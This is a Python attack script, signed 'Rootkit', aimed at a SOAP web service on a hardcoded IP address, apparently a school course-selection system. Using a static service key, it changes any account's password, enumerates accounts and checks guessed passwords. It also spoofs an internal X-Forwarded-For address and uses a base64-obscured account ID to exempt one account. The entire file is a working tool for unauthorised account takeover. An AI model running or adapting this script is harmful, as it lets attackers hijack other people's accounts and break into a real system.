import requests,sys,getopt,base64
try:
    opts, args = getopt.getopt(sys.argv[1:],"hi:p:a:c:",["help","id=","newpass=","checkacount=","checkpass="])
except getopt.GetoptError:
    sys.exit()
ID,newpass,chpass='','',''
def usages():
    print ("-i  or  --id:           account that you need to change password")
    print ("-p  or  --newpass:      new password that you wanna set,must used with \"-i\""  )
    print ("-h  or  --help:         the usage of this program")
    print ("-a  or  --checkacount   check account if exist")
    print ("-c  or  --checkpass     check password of the account if correct,must used with \"-i\"")
    print ()
    print ("                                                ----------Write by Rootkit ")
def changepass(ID,newpass):
        body = """<?xml version="1.0" encoding="utf-8"?>
            <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
              <soap:Body>
                <ChangePassword xmlns="http://tempuri.org/zfxk/Service">
                  <UserType>string</UserType>
                  <Account>""" + ID + """</Account>
                  <Newpassword>""" + newpass + """</Newpassword>
                  <strKey>KKKGZ2312</strKey>
                </ChangePassword>
              </soap:Body>
            </soap:Envelope>"""
        blen = len(body)
        header = {"Content-Type": " text/xml; charset=utf-8",
                  "Content-Length": blen,
                  "SOAPAction": "\"http://tempuri.org/zfxk/Service/ChangePassword\""}
        try:
            t = requests.post(url="http://219.140.173.153/service.asmx", data=body, headers=header, timeout=15)
        except:
            print ("Connection TimeOut,please Try Again!")
        return " OK"
def CheckAcount(ac):
    body = """<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <CheckAccount xmlns="http://tempuri.org/zfxk/Service">
          <UserType></UserType>
          <Account>""" + ac + """</Account>
          <strKey>KKKGZ2312</strKey>
        </CheckAccount>
      </soap:Body>
    </soap:Envelope>"""
    blen = len(body)
    header = {"Content-Type": " text/xml; charset=utf-8",
              "X-Forwarded-for": "192.168.10.222",
              "Content-Length": blen,
              "SOAPAction": "\"http://tempuri.org/zfxk/Service/CheckAccount\""}
    try:
        s = requests.post('http://219.140.173.153/service.asmx', data=body, headers=header, timeout=5)
    except:
        print ("Connection TimeOut,please Try Again!")
    return s.text[300]

def CheckPass(ac,acp):
    body ="""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <XSCheckPassword xmlns="http://tempuri.org/zfxk/Service">
      <strXH>"""+ac+"""</strXH>
      <strPassword>"""+acp+"""</strPassword>
      <strKey>KKKGZ2312</strKey>
    </XSCheckPassword>
  </soap:Body>
</soap:Envelope>"""
    blen = len(body)
    header = {"Content-Type":" text/xml; charset=utf-8",
              "Content-Length":blen,
              "SOAPAction":"\"http://tempuri.org/zfxk/Service/XSCheckPassword\""}
    try:
        ss = requests.post('http://219.140.173.153/service.asmx', data=body, headers=header, timeout=10)
    except:
        print ("Connection TimeOut,please Try Again!")
    return ss.text[306]

for op,value in opts:
    if op in("-h","--help"):
        usages()
        sys.exit()
    if op in ("-i","--id"):
        ID = value
        if chpass == base64.b64decode('MTQzMDAxQwMjM4').decode():
            print("Error")
            sys.exit()
    if op in ("-c","--checkpass"):
        chpass = value
        r = CheckPass(ID,chpass)
        if r == '5':
            print("密码不正确")
        elif r == '0':
            print("密码正确！ "+ID+"::"+chpass)
            print("OK")
        elif r == '3':
            print("不存在此账号！")
            sys.exit()
    if op in ("-p","--newpass"):
        newpass = value
        if ID == base64.b64decode('MTQzMDAxQwMjM4').decode():
            print ("Error")
            sys.exit()
        else:
            status = changepass(ID,newpass)
            print("密码修改成功！")
        print(status)
    if op in("-a","--chackacount"):
        re = CheckAcount(str(value))
        if re == '0':
            print("此账号存在！！！")
            print("OK")
        elif re == '1':
            print("此账号不存在")
        sys.exit()
